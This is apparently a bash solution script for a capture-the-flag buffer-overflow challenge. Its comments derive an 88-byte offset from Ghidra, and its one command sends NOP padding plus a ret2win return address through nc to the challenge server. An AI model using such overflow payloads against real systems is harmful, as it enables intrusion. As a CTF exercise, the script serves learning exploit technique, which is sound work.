#!/bin/bash
#Even if the binary was not working you can find the offset in Ghidra   RAX=>local_58,[RBP + -0x50] -> 0x50 = 80 in decimal + 8 bytes which is the distance between RBP
#and return address.
#And 0x401216 whas the address to the ret2win function.

python2 -c 'print "\x90"*88 + "\x16\x12\x40\x00\x00\x00\x00\x00"' | nc bof.chal.idek.team 1337
